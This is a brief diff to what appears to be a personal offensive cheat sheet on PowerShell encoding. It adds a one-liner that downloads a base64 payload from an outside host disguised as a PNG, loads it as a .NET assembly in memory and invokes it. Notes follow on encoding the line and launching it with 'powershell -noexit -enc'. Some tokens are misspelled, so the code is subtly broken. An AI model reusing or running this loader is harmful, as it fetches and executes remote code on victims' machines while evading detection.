@@ -67,5 +67,11 @@ $decode
 ------
 powershell -enc base64
 
+------------------------------
+
+[AppDomain]::CurrentDomain.Load([Convert]::Frombase64String((New-Object System.Net.WebClient).DownloadString('http://www.p.es/1.png'))).Entrypoint.nvoke($null,$null)
+converto to unicode
+powershell -noexti -enc base
+-----------------------
 
 
